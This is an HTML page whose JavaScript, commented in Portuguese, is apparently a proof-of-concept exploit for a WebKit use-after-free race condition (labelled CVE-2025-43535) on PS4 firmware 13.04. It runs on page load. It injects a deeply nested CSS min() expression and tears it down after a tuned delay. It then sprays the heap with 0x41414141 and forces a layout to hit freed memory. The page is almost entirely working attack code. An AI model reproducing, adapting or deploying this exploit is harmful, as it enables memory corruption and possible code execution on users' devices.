<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535 — UAF Native</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px; height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .warn{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<div>CVE-2025-43535 · UAF Race Condition · PS4 FW 13.04</div>
<div id="log"></div>
<div id="stage" style="position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden"></div>

<script>
"use strict";

const L = (m, c) => {
  const d = document.getElementById('log');
  d.innerHTML += `<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop = d.scrollHeight;
};

// ==========================================
// 1. O PAYLOAD FALSO (HEAP SPRAY)
// ==========================================
const SPRAY_CHUNK_SIZE = 1024 * 1024; // 4MB por chunk
const sprayData = new Uint32Array(SPRAY_CHUNK_SIZE);
sprayData.fill(0x41414141); // O ponteiro falso (AAAA)

const heapSprayArray = [];

function fireHeapSpray() {
  L('Pulverizando RAM com 0x41414141...', 'warn');
  try {
    for (let i = 0; i < 150; i++) { 
      heapSprayArray.push(new Uint32Array(sprayData));
    }
    L('Heap Spray alocou ~600MB sobre a memória liberada.', 'ok');
  } catch (e) {
    L('Heap Spray OOM no JS: ' + e, 'fail');
  }
}

// ==========================================
// 2. A ISCA MATEMÁTICA (Nível 24)
// ==========================================
function buildDepth(depth) {
  let e = '1px';
  for (let d = 1; d <= depth; d++) {
    e = 'min(' + e + ',' + e + ')';
  }
  return e;
}

// ==========================================
// 3. A CORRIDA (RACE CONDITION)
// ==========================================
// Como o nível 24 é mais leve, o parser vai processar mais rápido.
// A janela de tempo cai para a casa dos 30ms a 80ms.
const RACE_TIMEOUT_MS = 45; 

async function run() {
  L('Construindo isca de Nível 24 (~36MB no JS)...', 'warn');

  setTimeout(() => {
    let payload;
    try {
      payload = buildDepth(24);
      L('String construída. Injetando no C++ via tag <style>...', 'ok');
    } catch(e) {
      L('Falha ao gerar string: ' + e, 'fail');
      return;
    }

    // Criamos os elementos
    const styleEl = document.createElement('style');
    styleEl.textContent = `.t{width:${payload}}`;
    
    const divEl = document.createElement('div');
    divEl.className = 't';
    
    // Injetamos no DOM (O WebKit C++ começa a mastigar os 36MB agora)
    document.head.appendChild(styleEl);
    document.getElementById('stage').appendChild(divEl);

    // O C++ vai tentar montar a árvore e calcular o layout de divEl.
    // Nós interrompemos o processo milissegundos depois!
    setTimeout(() => {
      L('PUXANDO O TAPETE! Deletando árvore de estilos...', 'crash');
      
      // Remove do DOM (marca a árvore C++ para destruição)
      document.head.removeChild(styleEl);
      document.getElementById('stage').innerHTML = ''; 

      // Pulveriza a RAM imediatamente
      fireHeapSpray();

      L('Forçando o gatilho de layout no motor...', 'warn');
      try {
        // Se o WebKit ainda tiver ponteiros fantasmas da árvore, vai ler 0x41414141
        void document.body.offsetWidth; 
      } catch(e) {}

      L('-------------------------------------', 'info');
      L(`Teste concluído com Timeout de ${RACE_TIMEOUT_MS}ms.`, 'ok');
      L('Se o console não crashear, altere a variável RACE_TIMEOUT_MS.', 'info');
      L('-------------------------------------', 'info');

    }, RACE_TIMEOUT_MS);

  }, 100);
}

window.addEventListener('load', run);
</script>
</body>
</html>
